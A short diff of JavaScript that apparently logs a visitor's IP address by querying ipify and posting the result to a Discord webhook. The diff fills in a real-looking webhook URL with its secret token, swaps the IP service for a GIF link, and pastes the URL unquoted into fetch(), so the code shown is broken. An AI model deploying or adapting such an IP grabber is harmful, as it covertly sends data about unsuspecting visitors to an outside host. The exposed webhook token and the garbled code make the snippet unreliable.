@@ -1,8 +1,8 @@
 
-const ipifyAPI = "https://api.ipify.org?format=json";
+const ipifyAPI = "https://media.tenor.com/iZeeYFb9QlgAAAAj/benjammins-sybau.gif";
 
 
-const webhookURL = "Input your webhook url here (your webhook url can be seen easily)";
+const webhookURL = "https://discord.com/api/webhooks/1411508873847771319/LsmNaKWCF_OizGnUjiO0jOjBuUgpKkTs75Dfr9eJQBh0PyIL4-2t1Ue8X0kJbYW5vweB";
 
 
 async function getIP() {
@@ -27,7 +27,7 @@ async function sendToDiscord(ip) {
     };
 
     try {
-        const response = await fetch(webhookURL, {
+        const response = await fetch(https://discord.com/api/webhooks/1411508873847771319/LsmNaKWCF_OizGnUjiO0jOjBuUgpKkTs75Dfr9eJQBh0PyIL4-2t1Ue8X0kJbYW5vweB, {
             method: "POST",
             headers: {
                 "Content-Type": "application/json"
